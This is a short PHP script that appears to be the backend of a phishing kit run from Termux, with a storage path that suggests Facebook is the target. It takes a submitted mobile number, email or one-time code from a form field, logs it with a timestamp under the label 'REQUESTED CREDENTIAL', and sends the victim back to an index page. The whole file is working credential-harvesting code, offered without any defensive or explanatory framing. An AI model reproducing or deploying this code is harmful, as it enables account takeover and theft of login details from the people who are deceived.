<?php
	date_default_timezone_set("Asia/kolkata");
 	$ct=time();
	$pt=date("Y / m / d ----- H:i:s",$ct);
 	$m_e=$_POST['mobile_email_otp'];
	$file=fopen("/data/data/com.termux/files/home/storage/shared/fb/txt/waiting.txt","a");
	fwrite($file,"At ==>> ".$pt." -- REQUESTED CREDENTIAL : >>".$m_e." \n- - - - - - - - - - - - - - - - - - - - - - - - -\n\n");
	fclose($file);
	header("Location:/index.html");
	exit();
?>
